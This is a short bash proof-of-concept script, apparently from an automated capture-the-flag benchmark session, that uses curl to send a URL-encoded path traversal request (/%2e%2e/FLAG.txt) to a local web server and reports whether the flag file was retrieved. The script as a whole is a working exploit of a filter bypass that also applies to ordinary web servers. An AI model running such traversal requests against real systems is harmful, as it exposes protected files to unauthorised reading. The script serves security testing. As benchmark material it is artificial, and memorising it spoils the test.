#!/bin/bash
# POC: Demonstrates URL-encoded path traversal (%2e%2e/) bypass allowing access to FLAG.txt
# Target: ./repo
# Created: 2025-11-04T14:48:19.650Z
# Session: benchmark-XBEN-026-24-mhknowlp

# Encoded Path Traversal POC - %2e%2e/ Bypass
# This script demonstrates how URL-encoded dots (%2e%2e/) bypass simple path traversal filters
# Target: localhost:8080
# Goal: Access FLAG.txt using encoded path traversal

TARGET_URL="${1:-http://localhost:8080}"
OUTPUT_FILE="/tmp/encoded_traversal_response.txt"

echo "[*] Encoded Path Traversal POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Standard encoded traversal (%2e%2e/)
echo "[*] Test 1: Attempting encoded path traversal with %2e%2e/FLAG.txt"
echo "[*] Request: GET /%2e%2e/FLAG.txt"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/%2e%2e/FLAG.txt")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Response Code: $HTTP_CODE"
echo "[*] Response Body:"
echo "$BODY"
echo ""

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] SUCCESS: Server returned 200 OK"
    echo "[+] Encoded traversal bypass successful - FLAG.txt accessed!"
    
    # Check if we got the FLAG content
    if echo "$BODY" | grep -q "FLAG{"; then
        echo "[+] FLAG content retrieved: $BODY"
        exit 0
    else
        echo "[!] Response received but FLAG content not found"
        echo "[!] Response length: $(echo "$BODY" | wc -c) bytes"
        exit 0
    fi
else
    echo "[-] FAILED: HTTP $HTTP_CODE"
    echo "[-] Server blocked or returned error"
    exit 1
fi